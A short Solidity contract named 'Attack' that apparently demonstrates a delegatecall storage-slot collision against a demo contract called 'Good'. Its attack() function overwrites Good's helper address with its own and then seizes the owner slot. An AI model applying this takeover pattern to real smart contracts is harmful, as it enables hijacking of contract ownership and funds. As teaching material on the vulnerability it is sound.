//SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

// Import the Good contract
import "./Good.sol";

contract Attack {

// Declare a public variable to store the address of the helper
address public helper;

// Declare a public variable to store the address of the owner
address public owner;

// Declare a public variable to store a number
uint public num;

// Declare a public variable to store an instance of the Good contract
Good public good;

// Constructor function that takes in an instance of the Good contract
constructor(Good _good) {

    // Assign the passed in Good contract instance to the good variable
    good = Good(_good);
}

// Function to set the value of the num variable
function setNum(uint _num) public {

    // Set the value of owner to the address of the sender
    owner = msg.sender;
}

// Function to perform the attack
function attack() public {

    // Set the value of num in the Good contract to the address of this contract casted to a uint
    good.setNum(uint(uint160(address(this))));

    // Set the value of num in the Good contract to 1
    good.setNum(1);
}
}